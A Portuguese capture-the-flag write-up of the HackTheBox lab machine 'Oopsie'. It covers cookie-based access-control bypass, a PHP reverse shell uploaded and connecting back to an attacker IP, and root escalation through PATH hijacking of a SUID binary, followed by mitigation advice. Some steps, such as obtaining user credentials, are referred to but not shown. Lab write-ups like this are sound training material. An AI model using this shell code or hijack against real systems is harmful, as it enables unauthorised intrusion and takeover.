# HackTheBox — Oopsie 

## Informações

| Campo | Detalhe |
|---|---|
| Plataforma | HackTheBox Starting Point |
| Máquina | Oopsie |
| Tier | 1 |
| Dificuldade | Very Easy |
| Sistema | Linux / Web App |
| Técnicas | Broken Access Control, File Upload, Reverse Shell, Credential Disclosure, SUID, PATH Hijacking |
| IP alvo | `10.129.103.19` |

---

## Contexto

A máquina possui uma aplicação web com painel administrativo. A aplicação utiliza cookies para controlar privilégios e possui uma funcionalidade de upload acessível após manipulação de sessão.

A exploração começa com enumeração web, passa por abuso de controle de acesso, upload de um arquivo PHP executável e termina com escalada de privilégios local usando um binário SUID vulnerável a PATH Hijacking.

## Enumeração — Cookies e Controle de Acesso

No painel, a aplicação utilizava cookies para controlar a identidade e o privilégio do usuário.

Cookies iniciais:

```text

user = 34322
```

Isso indicou uma possível falha de controle de acesso, pois permissões sensíveis estavam sendo controladas no lado do cliente.

A partir da aplicação e da enumeração posterior, foi identificado o usuário `super admin` com o valor de acesso correto.

Valor importante encontrado:

```text
user = 86575
role = superadmin
```

Após alterar os cookies no navegador e atualizar a página, a aplicação passou a liberar funcionalidades administrativas, incluindo upload.

## Exploração — Upload de Web Shell

Com acesso ao upload, foi enviado um arquivo PHP executável.

Arquivo usado:

```php
<?php
$ip = "10.10.15.206";
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/bash -i", [
    0 => $sock,
    1 => $sock,
    2 => $sock
], $pipes);
?>
```

O IP usado deve ser o IP da interface VPN do HTB, normalmente `tun0`:

```bash
ip a show tun0
```

Listener no Kali:

```bash
nc -lvnp 4444
```

Após o upload, o arquivo foi acessado diretamente:

```text
http://10.129.103.19/uploads/shell.php
```

Conexão recebida:

```text
www-data@oopsie:/var/www/html/uploads$
```

RCE confirmada. O servidor executou o PHP enviado e retornou uma reverse shell.

## Enumeração — Binários SUID

Busca por binários SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Binário interessante encontrado:

```text
/usr/bin/bugtracker
```

Permissões:

```bash
ls -la /usr/bin/bugtracker
```

Resultado:

```text
-rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtracker
```

Interpretação:

```text
Dono: root
Grupo: bugtracker

```

Como `robert` pertence ao grupo `bugtracker`, ele consegue executar o binário.

---

## Análise — bugtracker

Execução do binário:

```bash
/usr/bin/bugtracker
```

O programa pede um ID de bug:

```text
Provide Bug ID:
```

Teste:

```text
1
```

O programa retorna um relatório localizado em `/root/reports/`.

Para analisar strings do binário:

```bash
strings /usr/bin/bugtracker | grep cat
```

Resultado importante:

```text
cat /root/reports/
```

O binário chama `cat` sem caminho absoluto.

Ou seja, ele usa:

```text
cat
```

em vez de:

```text
/bin/cat
```

Isso permite explorar PATH Hijacking.

---

## Exploração — PATH Hijacking

Como o binário roda com SUID root e chama `cat` sem caminho absoluto, é possível criar um `cat` falso em um diretório controlado pelo usuário.

Criação do `cat` malicioso:

```bash
cd /tmp
echo '/bin/bash' > cat
chmod +x cat
```

Alteração do PATH para priorizar `/tmp`:

```bash
export PATH=/tmp:$PATH
```

Confirmação:

```bash
which cat
```

Resultado esperado:

```text
/tmp/cat
```

Execução do binário vulnerável:

```bash
/usr/bin/bugtracker
```

Ao informar qualquer ID, por exemplo:

```text
1
```

O binário executa o `cat` falso, que na verdade abre `/bin/bash`.

Como o binário possui SUID root, a shell é aberta como root.

Confirmação:

```bash
whoami
```

Resultado:

```text
root
```

---

## Correção do PATH

Após a exploração, alguns comandos podem parar de funcionar porque o PATH foi alterado.

Correção:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Também é possível usar caminhos absolutos:

```bash
/usr/bin/whoami
/bin/cat /root/root.txt
```

Com shell root:

## Impacto

A máquina combina várias falhas que, juntas, permitem comprometimento completo do sistema.

Impactos principais:

- Controle de acesso fraco via cookies.
- Upload inseguro de arquivo PHP.
- Execução remota de código.
- Credenciais sensíveis expostas em arquivo de configuração.
- Reutilização de senha entre banco e usuário Linux.
- Binário SUID executando comando sem caminho absoluto.
- Escalada de privilégios até root.

---

## Mitigação

Medidas que evitariam a exploração:

- Não controlar privilégios apenas por cookies modificáveis pelo cliente.
- Validar autorização no servidor para cada ação sensível.
- Bloquear upload de arquivos executáveis como `.php`.
- Armazenar uploads fora do webroot.
- Desabilitar execução de PHP no diretório de uploads.
- Não deixar credenciais hardcoded em arquivos web.
- Usar senhas diferentes para banco e usuários do sistema.
- Evitar SUID em binários customizados.
- Usar caminhos absolutos em chamadas de sistema, como `/bin/cat`.
- Sanitizar entradas usadas em comandos do sistema.

---

## Aprendizados

- `www-data` normalmente é só o ponto inicial após explorar uma aplicação web.
- Após conseguir shell, o foco deve ser enumeração local.
- Arquivos em `/var/www/html` frequentemente guardam credenciais de banco.
- Credenciais de banco podem ser reutilizadas em usuários Linux.
- O comando `id` é essencial para identificar grupos importantes.
- Binários SUID devem ser analisados com `ls -la`, `file` e `strings`.
- PATH Hijacking ocorre quando um programa privilegiado chama comandos sem caminho absoluto.
- O fluxo realista é: web exploit → shell limitada → credenciais → usuário real → SUID → root.
